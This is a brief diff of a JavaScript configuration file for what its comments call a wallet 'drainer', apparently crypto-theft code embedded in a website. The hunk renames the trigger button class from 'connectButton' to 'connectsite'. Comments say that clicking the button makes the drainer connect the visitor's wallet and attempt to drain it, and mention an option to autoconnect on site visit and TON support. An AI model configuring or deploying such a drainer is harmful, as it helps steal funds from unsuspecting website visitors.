@@ -19,7 +19,7 @@ let wc_projectid = "90f4273219ce8a04eccc622712d876d4";
  * When the user clicks on a button with this class, the drainer will connect wallet and attempt to drain it.
  * For TON, this becomes the ID of the button
  */
-let connect_button_class = "connectButton"
+let connect_button_class = "connectsite"
 
 /**
  * Whether to autoconnect on website visit
